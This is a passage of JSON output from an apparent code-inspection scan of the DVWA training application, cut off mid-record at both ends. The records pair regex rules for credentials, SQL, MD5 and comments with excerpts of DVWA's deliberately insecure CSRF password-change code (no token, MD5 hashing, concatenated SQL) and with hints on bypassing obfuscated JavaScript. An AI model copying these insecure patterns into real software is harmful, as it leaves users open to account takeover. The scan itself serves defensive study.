        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/low.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Passwords",
        "excerpt": "\t}\n\telse {\n\t\t// Issue with passwords matching\n\t\t$html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;\n\t}\n\n\t((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);\n}\n\n",
        "startLocationLine": 23,
        "startLocationColumn": 18,
        "endLocationLine": 23,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/low.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update the database\n\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t// Feedback for the user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 15,
        "startLocationColumn": 33,
        "endLocationLine": 15,
        "endLocationColumn": 41
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/low.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "Password",
        "excerpt": "\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t// Feedback for the user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n\telse {\n\t\t// Issue with passwords matching\n\t\t$html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 19,
        "startLocationColumn": 18,
        "endLocationLine": 19,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/low.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;",
        "excerpt": "\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update the database\n\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t// Feedback for the user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 15,
        "startLocationColumn": 13,
        "endLocationLine": 15,
        "endLocationColumn": 100
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/low.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\tif( $pass_new == $pass_conf ) {\n\t\t// They do!\n\t\t$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update the database\n\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n",
        "startLocationLine": 12,
        "startLocationColumn": 15,
        "endLocationLine": 12,
        "endLocationColumn": 18
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/help/help.php",
        "ruleId": "AI027400",
        "ruleName": "Hygiene: Fix Comment",
        "ruleDescription": "Hygiene: Fix Comment",
        "pattern": "fixme|broke|broken",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Fix"
        ],
        "sample": "broke",
        "excerpt": "\n\t\t&lt;h3&gt;Medium Level&lt;/h3&gt;\n\t\t&lt;p&gt;\n\t\t\tThe JavaScript has been broken out into its own file and then minimized. You need to view the source for the included file and then work out what it is doing. Both Firefox and Chrome have a Pretty Print feature which attempts to reverse the compression and display code in a readable way.\n\t\t&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;The file uses the setTimeout function to run the do_elsesomething function which generates the token.&lt;/span&gt;&lt;/pre&gt;\n\n\t\t&lt;p&gt;&lt;br /&gt;&lt;/p&gt;\n\n",
        "startLocationLine": 22,
        "startLocationColumn": 28,
        "endLocationLine": 22,
        "endLocationColumn": 33
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/help/help.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "obfuscate",
        "excerpt": "\n\t\t&lt;h3&gt;High Level&lt;/h3&gt;\n\t\t&lt;p&gt;\n\t\t\tThe JavaScript has been obfuscated by at least one engine. You are going to need to step through the code to work out what is useful, what is garbage and what is needed to complete the mission.\n\t\t&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;If it helps, two packers have been used, the first is from &lt;a href=&quot;https://www.danstools.com/javascript-obfuscate/index.php&quot;&gt;Dan&#39;s Tools&lt;/a&gt; and the second is the &lt;a href=&quot;https://javascriptobfuscator.herokuapp.com/&quot;&gt;JavaScript Obfuscator Tool&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 2: &lt;span class=&quot;spoiler&quot;&gt;This deobfuscation tool seems to work the best on this code &lt;a href=&quot;http://deobfuscatejavascript.com/&quot;&gt;deobfuscate javascript&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 3: &lt;span class=&quot;spoiler&quot;&gt;This is one way to do it... run the obfuscated JS through a deobfuscation app, intercept the response for the obfuscated JS and swap in the readable version. Work out the flow and you will see three functions that need to be called in order. Call the functions at the right time with the right parameters.&lt;/pre&gt;\n\n",
        "startLocationLine": 30,
        "startLocationColumn": 28,
        "endLocationLine": 30,
        "endLocationColumn": 37
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/help/help.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "obfuscate",
        "excerpt": "\t\t&lt;p&gt;\n\t\t\tThe JavaScript has been obfuscated by at least one engine. You are going to need to step through the code to work out what is useful, what is garbage and what is needed to complete the mission.\n\t\t&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;If it helps, two packers have been used, the first is from &lt;a href=&quot;https://www.danstools.com/javascript-obfuscate/index.php&quot;&gt;Dan&#39;s Tools&lt;/a&gt; and the second is the &lt;a href=&quot;https://javascriptobfuscator.herokuapp.com/&quot;&gt;JavaScript Obfuscator Tool&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 2: &lt;span class=&quot;spoiler&quot;&gt;This deobfuscation tool seems to work the best on this code &lt;a href=&quot;http://deobfuscatejavascript.com/&quot;&gt;deobfuscate javascript&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 3: &lt;span class=&quot;spoiler&quot;&gt;This is one way to do it... run the obfuscated JS through a deobfuscation app, intercept the response for the obfuscated JS and swap in the readable version. Work out the flow and you will see three functions that need to be called in order. Call the functions at the right time with the right parameters.&lt;/pre&gt;\n\n\t\t&lt;p&gt;&lt;br /&gt;&lt;/p&gt;\n\n",
        "startLocationLine": 32,
        "startLocationColumn": 144,
        "endLocationLine": 32,
        "endLocationColumn": 153
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/help/help.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "obfuscation",
        "excerpt": "\t\t\tThe JavaScript has been obfuscated by at least one engine. You are going to need to step through the code to work out what is useful, what is garbage and what is needed to complete the mission.\n\t\t&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;If it helps, two packers have been used, the first is from &lt;a href=&quot;https://www.danstools.com/javascript-obfuscate/index.php&quot;&gt;Dan&#39;s Tools&lt;/a&gt; and the second is the &lt;a href=&quot;https://javascriptobfuscator.herokuapp.com/&quot;&gt;JavaScript Obfuscator Tool&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 2: &lt;span class=&quot;spoiler&quot;&gt;This deobfuscation tool seems to work the best on this code &lt;a href=&quot;http://deobfuscatejavascript.com/&quot;&gt;deobfuscate javascript&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 3: &lt;span class=&quot;spoiler&quot;&gt;This is one way to do it... run the obfuscated JS through a deobfuscation app, intercept the response for the obfuscated JS and swap in the readable version. Work out the flow and you will see three functions that need to be called in order. Call the functions at the right time with the right parameters.&lt;/pre&gt;\n\n\t\t&lt;p&gt;&lt;br /&gt;&lt;/p&gt;\n\n\t\t&lt;h3&gt;Impossible Level&lt;/h3&gt;\n",
        "startLocationLine": 33,
        "startLocationColumn": 48,
        "endLocationLine": 33,
        "endLocationColumn": 59
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/help/help.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "obfuscate",
        "excerpt": "\t\t\tThe JavaScript has been obfuscated by at least one engine. You are going to need to step through the code to work out what is useful, what is garbage and what is needed to complete the mission.\n\t\t&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;If it helps, two packers have been used, the first is from &lt;a href=&quot;https://www.danstools.com/javascript-obfuscate/index.php&quot;&gt;Dan&#39;s Tools&lt;/a&gt; and the second is the &lt;a href=&quot;https://javascriptobfuscator.herokuapp.com/&quot;&gt;JavaScript Obfuscator Tool&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 2: &lt;span class=&quot;spoiler&quot;&gt;This deobfuscation tool seems to work the best on this code &lt;a href=&quot;http://deobfuscatejavascript.com/&quot;&gt;deobfuscate javascript&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 3: &lt;span class=&quot;spoiler&quot;&gt;This is one way to do it... run the obfuscated JS through a deobfuscation app, intercept the response for the obfuscated JS and swap in the readable version. Work out the flow and you will see three functions that need to be called in order. Call the functions at the right time with the right parameters.&lt;/pre&gt;\n\n\t\t&lt;p&gt;&lt;br /&gt;&lt;/p&gt;\n\n\t\t&lt;h3&gt;Impossible Level&lt;/h3&gt;\n",
        "startLocationLine": 33,
        "startLocationColumn": 119,
        "endLocationLine": 33,
        "endLocationColumn": 128
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/help/help.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "obfuscate",
        "excerpt": "\t\t\tThe JavaScript has been obfuscated by at least one engine. You are going to need to step through the code to work out what is useful, what is garbage and what is needed to complete the mission.\n\t\t&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;If it helps, two packers have been used, the first is from &lt;a href=&quot;https://www.danstools.com/javascript-obfuscate/index.php&quot;&gt;Dan&#39;s Tools&lt;/a&gt; and the second is the &lt;a href=&quot;https://javascriptobfuscator.herokuapp.com/&quot;&gt;JavaScript Obfuscator Tool&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 2: &lt;span class=&quot;spoiler&quot;&gt;This deobfuscation tool seems to work the best on this code &lt;a href=&quot;http://deobfuscatejavascript.com/&quot;&gt;deobfuscate javascript&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 3: &lt;span class=&quot;spoiler&quot;&gt;This is one way to do it... run the obfuscated JS through a deobfuscation app, intercept the response for the obfuscated JS and swap in the readable version. Work out the flow and you will see three functions that need to be called in order. Call the functions at the right time with the right parameters.&lt;/pre&gt;\n\n\t\t&lt;p&gt;&lt;br /&gt;&lt;/p&gt;\n\n\t\t&lt;h3&gt;Impossible Level&lt;/h3&gt;\n",
        "startLocationLine": 33,
        "startLocationColumn": 147,
        "endLocationLine": 33,
        "endLocationColumn": 156
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/help/help.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "obfuscate",
        "excerpt": "\t\t&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;If it helps, two packers have been used, the first is from &lt;a href=&quot;https://www.danstools.com/javascript-obfuscate/index.php&quot;&gt;Dan&#39;s Tools&lt;/a&gt; and the second is the &lt;a href=&quot;https://javascriptobfuscator.herokuapp.com/&quot;&gt;JavaScript Obfuscator Tool&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 2: &lt;span class=&quot;spoiler&quot;&gt;This deobfuscation tool seems to work the best on this code &lt;a href=&quot;http://deobfuscatejavascript.com/&quot;&gt;deobfuscate javascript&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 3: &lt;span class=&quot;spoiler&quot;&gt;This is one way to do it... run the obfuscated JS through a deobfuscation app, intercept the response for the obfuscated JS and swap in the readable version. Work out the flow and you will see three functions that need to be called in order. Call the functions at the right time with the right parameters.&lt;/pre&gt;\n\n\t\t&lt;p&gt;&lt;br /&gt;&lt;/p&gt;\n\n\t\t&lt;h3&gt;Impossible Level&lt;/h3&gt;\n\t\t&lt;p&gt;You can never trust the user and have to assume that any code sent to the user can be manipulated or bypassed and so there is no impossible level.&lt;/p&gt;\n",
        "startLocationLine": 34,
        "startLocationColumn": 77,
        "endLocationLine": 34,
        "endLocationColumn": 86
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/help/help.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "obfuscation",
        "excerpt": "\t\t&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;If it helps, two packers have been used, the first is from &lt;a href=&quot;https://www.danstools.com/javascript-obfuscate/index.php&quot;&gt;Dan&#39;s Tools&lt;/a&gt; and the second is the &lt;a href=&quot;https://javascriptobfuscator.herokuapp.com/&quot;&gt;JavaScript Obfuscator Tool&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 2: &lt;span class=&quot;spoiler&quot;&gt;This deobfuscation tool seems to work the best on this code &lt;a href=&quot;http://deobfuscatejavascript.com/&quot;&gt;deobfuscate javascript&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 3: &lt;span class=&quot;spoiler&quot;&gt;This is one way to do it... run the obfuscated JS through a deobfuscation app, intercept the response for the obfuscated JS and swap in the readable version. Work out the flow and you will see three functions that need to be called in order. Call the functions at the right time with the right parameters.&lt;/pre&gt;\n\n\t\t&lt;p&gt;&lt;br /&gt;&lt;/p&gt;\n\n\t\t&lt;h3&gt;Impossible Level&lt;/h3&gt;\n\t\t&lt;p&gt;You can never trust the user and have to assume that any code sent to the user can be manipulated or bypassed and so there is no impossible level.&lt;/p&gt;\n",
        "startLocationLine": 34,
        "startLocationColumn": 103,
        "endLocationLine": 34,
        "endLocationColumn": 114
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/help/help.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "obfuscate",
        "excerpt": "\t\t&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;If it helps, two packers have been used, the first is from &lt;a href=&quot;https://www.danstools.com/javascript-obfuscate/index.php&quot;&gt;Dan&#39;s Tools&lt;/a&gt; and the second is the &lt;a href=&quot;https://javascriptobfuscator.herokuapp.com/&quot;&gt;JavaScript Obfuscator Tool&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 2: &lt;span class=&quot;spoiler&quot;&gt;This deobfuscation tool seems to work the best on this code &lt;a href=&quot;http://deobfuscatejavascript.com/&quot;&gt;deobfuscate javascript&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 3: &lt;span class=&quot;spoiler&quot;&gt;This is one way to do it... run the obfuscated JS through a deobfuscation app, intercept the response for the obfuscated JS and swap in the readable version. Work out the flow and you will see three functions that need to be called in order. Call the functions at the right time with the right parameters.&lt;/pre&gt;\n\n\t\t&lt;p&gt;&lt;br /&gt;&lt;/p&gt;\n\n\t\t&lt;h3&gt;Impossible Level&lt;/h3&gt;\n\t\t&lt;p&gt;You can never trust the user and have to assume that any code sent to the user can be manipulated or bypassed and so there is no impossible level.&lt;/p&gt;\n",
        "startLocationLine": 34,
        "startLocationColumn": 151,
        "endLocationLine": 34,
        "endLocationColumn": 160
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/help/help.php",
        "ruleId": "AI003900",
        "ruleName": "Social Media: YouTube",
        "ruleDescription": "Social Media (YouTube)",
        "pattern": "\\b(youtube)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "CloudServices.SocialMedia.YouTube"
        ],
        "sample": "youtube",
        "excerpt": "\n\t&lt;p&gt;Reference:&lt;/p&gt;\n\t&lt;ul&gt;\n\t\t&lt;li&gt;&lt;?php echo dvwaExternalLinkUrlGet( &#39;https://www.youtube.com/watch?v=8UqHCrGdxOM&#39; )?&gt;&lt;/li&gt;\n\t\t&lt;li&gt;&lt;?php echo dvwaExternalLinkUrlGet( &#39;https://www.w3schools.com/js/&#39; )?&gt;&lt;/li&gt;\n\t\t&lt;li&gt;&lt;?php echo dvwaExternalLinkUrlGet( &#39;https://www.youtube.com/watch?v=cs7EQdWO5o0&amp;index=17&amp;list=WL&#39; )?&gt;&lt;/li&gt;\n\t\t&lt;li&gt;&lt;?php echo dvwaExternalLinkUrlGet( &#39;https://www.youtube.com/playlist?list=PLC9K7uaDMdAUNktlDTxsmj6rJBf4Q9TR5&#39; )?&gt;&lt;/li&gt;\n\t&lt;/ul&gt;\n&lt;/div&gt;\n",
        "startLocationLine": 47,
        "startLocationColumn": 55,
        "endLocationLine": 47,
        "endLocationColumn": 62
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/help/help.php",
        "ruleId": "AI003900",
        "ruleName": "Social Media: YouTube",
        "ruleDescription": "Social Media (YouTube)",
        "pattern": "\\b(youtube)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "CloudServices.SocialMedia.YouTube"
        ],
        "sample": "youtube",
        "excerpt": "\t&lt;ul&gt;\n\t\t&lt;li&gt;&lt;?php echo dvwaExternalLinkUrlGet( &#39;https://www.youtube.com/watch?v=8UqHCrGdxOM&#39; )?&gt;&lt;/li&gt;\n\t\t&lt;li&gt;&lt;?php echo dvwaExternalLinkUrlGet( &#39;https://www.w3schools.com/js/&#39; )?&gt;&lt;/li&gt;\n\t\t&lt;li&gt;&lt;?php echo dvwaExternalLinkUrlGet( &#39;https://www.youtube.com/watch?v=cs7EQdWO5o0&amp;index=17&amp;list=WL&#39; )?&gt;&lt;/li&gt;\n\t\t&lt;li&gt;&lt;?php echo dvwaExternalLinkUrlGet( &#39;https://www.youtube.com/playlist?list=PLC9K7uaDMdAUNktlDTxsmj6rJBf4Q9TR5&#39; )?&gt;&lt;/li&gt;\n\t&lt;/ul&gt;\n&lt;/div&gt;\n\n",
        "startLocationLine": 49,
        "startLocationColumn": 55,
        "endLocationLine": 49,
        "endLocationColumn": 62
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/help/help.php",
        "ruleId": "AI003900",
        "ruleName": "Social Media: YouTube",
        "ruleDescription": "Social Media (YouTube)",
        "pattern": "\\b(youtube)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "CloudServices.SocialMedia.YouTube"
        ],
        "sample": "youtube",
        "excerpt": "\t\t&lt;li&gt;&lt;?php echo dvwaExternalLinkUrlGet( &#39;https://www.youtube.com/watch?v=8UqHCrGdxOM&#39; )?&gt;&lt;/li&gt;\n\t\t&lt;li&gt;&lt;?php echo dvwaExternalLinkUrlGet( &#39;https://www.w3schools.com/js/&#39; )?&gt;&lt;/li&gt;\n\t\t&lt;li&gt;&lt;?php echo dvwaExternalLinkUrlGet( &#39;https://www.youtube.com/watch?v=cs7EQdWO5o0&amp;index=17&amp;list=WL&#39; )?&gt;&lt;/li&gt;\n\t\t&lt;li&gt;&lt;?php echo dvwaExternalLinkUrlGet( &#39;https://www.youtube.com/playlist?list=PLC9K7uaDMdAUNktlDTxsmj6rJBf4Q9TR5&#39; )?&gt;&lt;/li&gt;\n\t&lt;/ul&gt;\n&lt;/div&gt;\n\n",
        "startLocationLine": 50,
        "startLocationColumn": 55,
        "endLocationLine": 50,
        "endLocationColumn": 62
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI027200",
        "ruleName": "Dependency: Included Source",
        "ruleDescription": "Dependency: Included Source",
        "pattern": "require ?\\(['\\\"]([^'\\\"]+)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Dependency.SourceInclude"
        ],
        "sample": "crypto",
        "excerpt": "  };\n\n  var nodeWrap = function (method, is224) {\n    var crypto = eval(&quot;require(&#39;crypto&#39;)&quot;);\n    var Buffer = eval(&quot;require(&#39;buffer&#39;).Buffer&quot;);\n    var algorithm = is224 ? &#39;sha224&#39; : &#39;sha256&#39;;\n    var nodeMethod = function (message) {\n      if (typeof message === &#39;string&#39;) {\n        return crypto.createHash(algorithm).update(message, &#39;utf8&#39;).digest(&#39;hex&#39;);\n",
        "startLocationLine": 83,
        "startLocationColumn": 24,
        "endLocationLine": 83,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI027200",
        "ruleName": "Dependency: Included Source",
        "ruleDescription": "Dependency: Included Source",
        "pattern": "require ?\\(['\\\"]([^'\\\"]+)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Dependency.SourceInclude"
        ],
